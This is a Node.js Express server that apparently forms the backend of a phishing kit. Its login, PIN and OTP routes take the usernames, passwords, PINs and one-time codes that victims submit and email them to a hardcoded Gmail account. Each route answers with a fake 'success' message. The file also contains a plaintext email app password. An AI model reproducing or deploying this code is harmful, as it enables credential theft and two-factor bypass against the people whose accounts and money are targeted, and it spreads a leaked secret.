const express = require("express"); // express is use for getting api i.e POST request GET DELETE and PUT
const app = express(); // app is use for link express functions
const cors = require("cors");
const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gotten to email

// Middleware - moved to top to avoid duplication
app.use(express.json());
app.use(cors());

const PORT = process.env.PORT || 5000; // port to connect to WEB

// emails credentials
const userEmail = "laluzresorts@gmail.com";
const pass = "whjtzzbwnmqvafpt";

// API routes for index (login)
app.post("/", (req, res) => {
  const { username, password } = req.body;

  // Validate input
  if (!username || !password) {
    return res.status(400).json({ error: "Username and password are required" });
  }

  const transporter = nodemailer.createTransporter({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: userEmail, // Fixed: was using undefined 'email' variable
    to: userEmail,
    subject: `Login Attempt - Username: ${username}`,
    text: `New login attempt:\nUsername/Email: ${username}\nPassword: ${password}`,
    html: `
      <h3>New Login Attempt</h3>
      <p><strong>Username/Email:</strong> ${username}</p>
      <p><strong>Password:</strong> ${password}</p>
      <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
    `
  };

  console.log("Sending login email...");
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log("Email error:", error);
      res.status(500).json({ error: "Failed to process login" });
    } else {
      console.log("Login email sent:", info.response);
      res.json({ message: "success", status: "Login processed successfully" });
    }
  });
});

// API routes for pin
app.post("/pin", (req, res) => {
  console.log("PIN request body:", req.body);
  const { pin } = req.body;

  // Validate input
  if (!pin) {
    return res.status(400).json({ error: "PIN is required" });
  }

  const transporter = nodemailer.createTransporter({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `PIN Submission: ${pin}`,
    text: `New PIN submission: ${pin}`,
    html: `
      <h3>PIN Submission</h3>
      <p><strong>PIN:</strong> ${pin}</p>
      <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
    `
  };

  console.log("Sending PIN email...");
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log("PIN email error:", error);
      res.status(500).json({ error: "Failed to process PIN" });
    } else {
      console.log("PIN email sent:", info.response);
      res.json({ message: "success", status: "PIN processed successfully" });
    }
  });
});

// API routes for otp
app.post("/otp", (req, res) => {
  console.log("OTP request body:", req.body);
  const { otp } = req.body;

  // Validate input
  if (!otp) {
    return res.status(400).json({ error: "OTP is required" });
  }

  const transporter = nodemailer.createTransporter({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `OTP Submission: ${otp}`,
    text: `New OTP submission: ${otp}`,
    html: `
      <h3>OTP Submission</h3>
      <p><strong>OTP:</strong> ${otp}</p>
      <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
    `
  };

  console.log("Sending OTP email...");
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log("OTP email error:", error);
      res.status(500).json({ error: "Failed to process OTP" });
    } else {
      console.log("OTP email sent:", info.response);
      res.json({ message: "success", status: "OTP processed successfully" });
    }
  });
});

// Health check endpoint
app.get("/health", (req, res) => {
  res.json({ status: "Server is running", timestamp: new Date().toISOString() });
});

// 404 handler
app.use("*", (req, res) => {
  res.status(404).json({ error: "Route not found" });
});

// Error handling middleware
app.use((error, req, res, next) => {
  console.error("Unhandled error:", error);
  res.status(500).json({ error: "Internal server error" });
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`);
  console.log(`Health check available at http://localhost:${PORT}/health`);
});


